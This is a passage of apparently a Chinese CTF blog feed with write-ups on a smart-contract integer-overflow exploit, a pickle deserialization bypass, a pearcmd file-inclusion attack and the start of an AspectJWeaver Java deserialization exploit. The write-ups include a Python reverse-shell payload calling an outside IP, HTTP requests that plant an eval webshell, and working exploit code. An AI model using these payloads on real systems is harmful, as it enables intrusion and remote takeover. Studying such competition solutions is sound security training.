src="https://img-blog.csdnimg.cn/img_convert/0fc06949e2bd8ab9aa17d280d7cf7191.png"></p><p>现在能够调用任意函数，但是还需要绕过148行<code>totalVotes &lt;= balanceOf(msg.sender)</code>，所以这里还存在一个<code>integer overflow</code>溢出漏洞。</p><blockquote><p>第 145 行存在一个 integer overflow ，所以我们可以两个 ballot 投票，票数分别为 2^256-1（投给 attacker ） 和 1 (投给 Alice 或 Bob 任意一个)，这样利用 145 行的 integer overflow 便可通过 148 行的限制，同时使 attacker 票数为 2^256-1 ，可通过 getWinner() 赢得选票</p></blockquote><p><a href="https://xz.aliyun.com/t/9693">关于溢出</a></p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>首先需要四个不同后缀的账户<br><code>0x9aC4ef4fed53a395Bcb4004Cd8DffEE73CC46800</code> 00<br><code>0xD9ee07AAf7e3d5951721f7deB46802207f4dF001</code> 01<br><code>0x89eB2cD0eC49Cf1B584d3b4bdb6453B1f16c3203</code> 03<br><code>0x88C87F1365F793dd79c4b2A60f238C8594e9d602</code> 02</p><p>题目合约地址<br><code>0xef31471E3004a78Ae403858BbcB27D6d1f37791C</code></p><p>candidate账户<br><code>0x0000000000000000000000000000000000009453</code>Alice<br><code>0x0000000000000000000000000000000000009487</code>Bob<br><code>0x9c5D5bE2a76503957853d9b6f81fFDE226635739</code>攻击账户</p><p>首先需要向我们的攻击账户转64块钱，因为上面说到需要在调用<code>propose</code>的时候设置value为64，而在<code>_transfer</code>中存在限制<code> require(_balances[from] &gt;= value, &quot;ERC223: transfer amount exceeds balance&quot;);</code>所以需要先转64元钱。</p><p>通过这个合约来让<code>_balances[attacker_address]=64</code>,脚本原理就是先通过<code>giveMeMoney</code>获取一块钱，此时就可以满足<code>_balances[from] &gt;= value</code>了。之后就能在第52行通过<code>_balances[to] += value;</code>不断加钱。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">import &#39;.&#x2F;Elction.sol&#39;;<br>contract send &#123;<br>    Election target &#x3D; Election(0xef31471E3004a78Ae403858BbcB27D6d1f37791C);<br>    <br>    function getmoney(uint times) public &#123;<br>        for (uint i&#x3D;0; i&lt;times; i++) &#123;<br>            target.giveMeMoney();<br>            target.transfer(0x9c5D5bE2a76503957853d9b6f81fFDE226635739, 1, &quot;&quot;, &quot;&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/7eaf50fc1b5394b0cb7b9c7c2c83919f.png"></p><p>第二步就是进行vote投票，进行整数溢出，准备两个 ballot，一个投给 attacker，票数为 2^256-1 ；一个投给 Alice，票数为 1。</p><figure class="highlight prolog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs prolog">ballotEncode([[<span class="hljs-string">&quot;0x9c5d5be2a76503957853d9b6f81ffde226635739&quot;</span>,<span class="hljs-string">&quot;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&quot;</span>], [<span class="hljs-string">&quot;0x0000000000000000000000000000000000009453&quot;</span>,<span class="hljs-string">&quot;0x1&quot;</span>]])<br></code></pre></div></td></tr></table></figure><p>编码结果为</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4a3a9c84f3af69e4ac9af75c11997d26.png"></p><p>查看votehashes，发现成功显示</p><p><img src="https://img-blog.csdnimg.cn/img_convert/55fba7674f7f8c25098cac0fa3e82b90.png"></p><p>然后需要切换到00后缀账户调用<code>_setStage</code>修改stage变量为0，再调用<code>propose</code>将 attacker 增加到 candidate。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/65c62963d63dfedddbdbd87d404f9d3e.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/dda6bb7007aaa81693426b675de1eb18.png"></p><p>查看 proposals 可以看到添加 attacker 为 candidate 成功<br><img src="https://img-blog.csdnimg.cn/img_convert/a5b3450f80f9cc85f3ce171943b36578.png"></p><p>这里顺便分析一下<code>transfer</code>调用<code>propose</code>的abi编码.</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">Function: transfer(address _to, <span class="hljs-built_in">uint</span>256 _value, bytes _data, <span class="hljs-built_in">string</span> _custom_fallback) ***<br><br>MethodID: <span class="hljs-number">0xf6368f8a</span><br><br><span class="hljs-comment">// transfer第一个参数msg.sender，直接写入slot</span><br><span class="hljs-string">[0]</span>:  <span class="hljs-number">000000000000000000000000</span>ef31471e3004a78ae403858bbcb27d6d1f37791c<br><br><span class="hljs-comment">//uint256定长参数，也是直接写入内容</span><br><span class="hljs-string">[1]</span>:  <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000040</span><br><br><span class="hljs-comment">//第三个是变长参数bytes _data，先写入offset，函数参数有4个所以为0x20*4=0x80</span><br><span class="hljs-string">[2]</span>:  <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000080</span><br><br><span class="hljs-comment">//最后一个变长参数，计算其pffset：0x80 + 0x20*5(前一个变长类型的值所用槽数) + 0x20(前一个变长类型存储长度占用槽数) = 0x140</span><br><span class="hljs-string">[3]</span>:  <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000140</span><br><br>data的长度 <span class="hljs-number">0x20</span>*<span class="hljs-number">5</span> = <span class="hljs-number">0xa0</span><br><span class="hljs-string">[4]</span>:  <span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000</span>a0<br><br><span class="hljs-comment">//data数据值</span><br><span class="hljs-string">[5]</span>:  <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000001</span><br><span class="hljs-string">[6]</span>:  <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000006</span><br><span class="hljs-string">[7]</span>:  <span class="hljs-number">6</span>b6b66696e650000000000000000000000000000000000000000000000000000<br><span class="hljs-string">[8]</span>:  <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000018</span><br><span class="hljs-string">[9]</span>:  <span class="hljs-number">47697665206</span>d652074686520666c61672c20706c656173650000000000000000<br><br><span class="hljs-comment">//_custom_fallback边长参数的长度</span><br><span class="hljs-string">[10]</span>: <span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000025</span><br><br><span class="hljs-comment">//_custom_fallback的值（即为propose(address,(string,string,bool)）</span><br><span class="hljs-string">[11]</span>: <span class="hljs-number">70726f</span>706f736528616464726573732c28737472696e672c737472696e672c62<br><span class="hljs-string">[12]</span>: <span class="hljs-number">6f</span>6f6c2929000000000000000000000000000000000000000000000000000000<br><br></code></pre></div></td></tr></table></figure><p>然后切换到02后缀修改stage为2，进行 reveal 调用，其中 ballots 是上面已经传入的ballots (使用 attacker账户 )，调用完后查看 voteCount[attacker] 已经是 2^256-1</p><p><img src="https://img-blog.csdnimg.cn/img_convert/42856ad6f4aa81ecb8d00fdead2c3052.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d4ddc85d5be19fb452f947141eeb50a9.png"></p><p>最后切换到03后缀账户，设值stage为3。<br><img src="https://img-blog.csdnimg.cn/img_convert/654f8cff10ecf7fb788de83fd7025033.png"></p><p>然后调用 giveMeFlag()即可(使用 attacker账户)，不过这最后一步我不小心给自己账户设置成revealed true了，所以最后就放本地的图得了(合约地址为0x7fe5E6C8eE2EC92c5aA9912499f364540640d152)</p><p><img src="https://img-blog.csdnimg.cn/img_convert/faf1244f17b8f76c6ce33d03ffec6627.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>蓝帽pickle反序列化新方法</title>
    <link href="/2022/08/01/2022-8-1-%E8%93%9D%E5%B8%BDpickle%E6%96%B0%E6%96%B9%E6%B3%95bypass/"/>
    <url>/2022/08/01/2022-8-1-%E8%93%9D%E5%B8%BDpickle%E6%96%B0%E6%96%B9%E6%B3%95bypass/</url>
    
    <content type="html"><![CDATA[<h1 id="蓝帽杯file-session（pickle反序列化新方法）"><a href="#蓝帽杯file-session（pickle反序列化新方法）" class="headerlink" title="蓝帽杯file_session（pickle反序列化新方法）"></a>蓝帽杯file_session（pickle反序列化新方法）</h1><h2 id="伪造cookie"><a href="#伪造cookie" class="headerlink" title="伪造cookie"></a>伪造cookie</h2><p>这题考点很多，最后的pickle反序列化做法确实很新颖，让人学到了很多东西。</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkyNDA5NjgyMg==&mid=2247493655&idx=1&sn=2eafc10949807487d993882220d05271&chksm=c1d9a84ef6ae2158dac0f1e00fc04efd4e8a0966e16aaaf7a1c00e46ff1fa97b5f574d051721&mpshare=1&scene=23&srcid=0713FFhRTme2jwTBSbUlN5zx&sharer_sharetime=1657706228412&sharer_shareid=0448df7bad9a24b90573e02890e727f8#rd">官方wp</a><br><a href="https://xz.aliyun.com/t/7436">pickle反序列化原理</a><br>可以控制读取的offset从哪开始，尝试读取内存文件。这部分参考wp，注意别忘了时间戳不一样，伪造了cookie后就能进行pickle反序列化了。</p><h2 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h2><p>题目在_loads中将<code>R i o b</code>全部ban了，所以需要寻找新的方法。<br>payload为<code>bytes.__new__(bytes,map.__new__(map,eval,[&#39;print(11111)&#39;]))</code><br>利用方法很新颖，学到了属于，具体调用可以参考wp。题目最终的opcode是这样的，利用的是<code>_loads</code>函数，但是其实还有一个<code>loads</code>函数，所以这里尝试了用<code>loads</code>函数写了另外一种opcode</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pickle <span class="hljs-keyword">import</span> _loads<br>b= <span class="hljs-string">b&#x27;&#x27;&#x27;c__builtin__</span><br><span class="hljs-string">map</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0(]S&#x27;print(1111)&#x27;</span><br><span class="hljs-string">ap1</span><br><span class="hljs-string">0](c__builtin__</span><br><span class="hljs-string">exec</span><br><span class="hljs-string">g1</span><br><span class="hljs-string">ep2</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">g2</span><br><span class="hljs-string">\x81p3</span><br><span class="hljs-string">0c__builtin__</span><br><span class="hljs-string">bytes</span><br><span class="hljs-string">p4</span><br><span class="hljs-string">g3</span><br><span class="hljs-string">\x81</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br>_loads(b)<br></code></pre></div></td></tr></table></figure><p>用<code>loads</code>函数的话，其实只需要给参数都改为元组形式，因为上面的opcode在<code>loads</code>函数下会报一个错误.<br><img src="https://img-blog.csdnimg.cn/064ec0062b2443fcbb10033ec20734ce.png" alt="在这里插入图片描述"><br>回到pickle源码可以看到<code>loads</code>函数其实是从<code>_pickle</code>中引进的，而<code>_loads</code>函数就在<code>pickle</code>里实现了，两者的实现过程是不一样的。看<code>_pickle</code>的源码就能发现它要求你的参数为元组而不能是列表，所以用<code>t</code>操作码即可。</p><p><img src="https://img-blog.csdnimg.cn/e38ec9cb3ba848359c28914c6ce7cb04.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pickle <span class="hljs-keyword">import</span> loads<br><span class="hljs-comment"># from pickle import loads</span><br><span class="hljs-comment"># bytes.__new__(bytes,map.__new__(map,eval,[&#x27;print(11111)&#x27;]))</span><br>b= <span class="hljs-string">b&#x27;&#x27;&#x27;c__builtin__</span><br><span class="hljs-string">map</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0(]S&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;39.107.239.30&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="hljs-string">ap1</span><br><span class="hljs-string">0(c__builtin__</span><br><span class="hljs-string">exec</span><br><span class="hljs-string">g1</span><br><span class="hljs-string">tp2</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">g2</span><br><span class="hljs-string">\x81p3</span><br><span class="hljs-string">0c__builtin__</span><br><span class="hljs-string">bytes</span><br><span class="hljs-string">p4</span><br><span class="hljs-string">0g4</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">t\x81p5</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br>loads(b)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN 半决赛</title>
    <link href="/2022/07/24/2022-7-24-CISCN%20%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <url>/2022/07/24/2022-7-24-CISCN%20%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN-半决赛"><a href="#CISCN-半决赛" class="headerlink" title="CISCN 半决赛"></a>CISCN 半决赛</h1><p>[TOC]</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="JAVA（赛后复现）"><a href="#JAVA（赛后复现）" class="headerlink" title="JAVA（赛后复现）"></a>JAVA（赛后复现）</h3><p>还是不太会，网上也没得解析，比赛的时候好像就是0解。回头问问eki学霸。</p><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>pearcmd文件包含，一开始以为是session文件包含竞争，但.php绕不过，卡了好久。</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?+config-create+/&amp;page=../../../tmp/hello&amp;123=system(&#x27;cat+/hahabsOXYHmRbpFpya5_fIa9&#x27;);</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>39.104.82.208:35149<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XDEBUG_SESSION=XDEBUG_ECLIPSE; PHPSESSID=fsfsfsdfsdf<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><br></code></pre></div></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?+config-create+/&amp;page=../../../usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_GET[123]);?&gt;+/tmp/hello.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>39.104.82.208:35149<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XDEBUG_SESSION=XDEBUG_ECLIPSE; PHPSESSID=fsfsfsdfsdf<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn2021 finnal复现</title>
    <link href="/2022/07/24/2022-7-24-ciscn2021%20finnal%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/07/24/2022-7-24-ciscn2021%20finnal%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn2021-finnal复现"><a href="#ciscn2021-finnal复现" class="headerlink" title="ciscn2021 finnal复现"></a>ciscn2021 finnal复现</h1><p>要打国赛finnal了，把去年的题抽时间做一做。</p><h2 id="ezj4va"><a href="#ezj4va" class="headerlink" title="ezj4va"></a>ezj4va</h2><p>虽然源码看着很多，但是链子还是不是很难的。</p><h3 id="关于AspectJWeaver反序列化"><a href="#关于AspectJWeaver反序列化" class="headerlink" title="关于AspectJWeaver反序列化"></a>关于AspectJWeaver反序列化</h3><p>首先来看链子，很明显还需要cc3.2依赖。</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>put<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>write<span class="hljs-constructor">ToPath()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">FileOutputStream</span>.</span></span>write<span class="hljs-literal">()</span><br></code></pre></div></td></tr></table></figure><p>主要在于后面的链子，漏洞出发点在<code>SimpleCache$StorableCachingMap.writeToPath()</code>。writeToPath中key和value分别是文件名和内容。<br><img src="https://img-blog.csdnimg.cn/9c30104cb4ef4edb8d8ae1b682ee0683.png" alt="在这里插入图片描述"></p><p><code>org.aspectj.weaver.tools.cache.SimpleCache.StoreableCachingMap#put</code>中调用了writeToPath。所以反序列化的时候触发put方法就行了。<br><img src="https://img-blog.csdnimg.cn/64cae1577f1d4d508533e30baa92e9f8.png" alt="在这里插入图片描述"></p><p>这个类接受两个参数，并且方法名为put。那就可以拼接上LazyMap的链子即可<br><img src="https://img-blog.csdnimg.cn/6e663c16fc0c4733a0d6707171971aa8.png" alt="在这里插入图片描述"></p><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>拖下来源码审计，/cart/*路由下有三个子处理，挑一个看就行了<br><img src="https://img-blog.csdnimg.cn/3e56dab0632a473ab39a766554f8435a.png" alt="在这里插入图片描述"></p><p>/cart/add最终是调用了addToCart函数。在这个函数里主动调用了put方法，并且反序列出来的cart类我们是可控的，所以直接将skuDescribe设置成<code>SimpleCache$StorableCachingMap</code>就行了<br><img src="https://img-blog.csdnimg.cn/11ee5e8f5aa14cddb43acb0d3f09bff4.png" alt="在这里插入图片描述"></p><p>调用链变成</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CartServiceImpl</span>.</span></span>add<span class="hljs-constructor">ToCart()</span> <span class="hljs-comment">//反序列化成cart对象</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Deserializer</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CartServiceImpl</span>.</span></span>add<span class="hljs-constructor">ToCart()</span><span class="hljs-comment">//存在put方法</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>put<span class="hljs-literal">()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>write<span class="hljs-constructor">ToPath()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">FileOutputStream</span>.</span></span>write<span class="hljs-literal">()</span><br></code></pre></div></td></tr></table></figure><p>exp如下</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ciscn.fina1.ezj4va.domain.Cart;<br><span class="hljs-keyword">import</span> ciscn.fina1.ezj4va.service.impl.CartServiceImpl;<br><span class="hljs-keyword">import</span> ciscn.fina1.ezj4va.utils.Deserializer;<br><span class="hljs-keyword">import</span> ciscn.fina1.ezj4va.utils.Evil;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">getCookie</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        <span class="hljs-comment">// 创建StoreableCachingMap对象</span><br>        Constructor&lt;?&gt; constructor = Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>).getDeclaredConstructor(String.class, <span class="hljs-keyword">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Map&lt;String,Object&gt; map = (Map&lt;String, Object&gt;) constructor.newInstance(<span class="hljs-string">&quot;./target/classes&quot;</span>, <span class="hljs-number">123</span>);<br><br>        Cart cart = <span class="hljs-keyword">new</span> Cart();<br>        cart.setSkuDescribe(map);<br><br>        String oldCartStr = Deserializer.serialize(cart);<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        Cart test= (Cart) 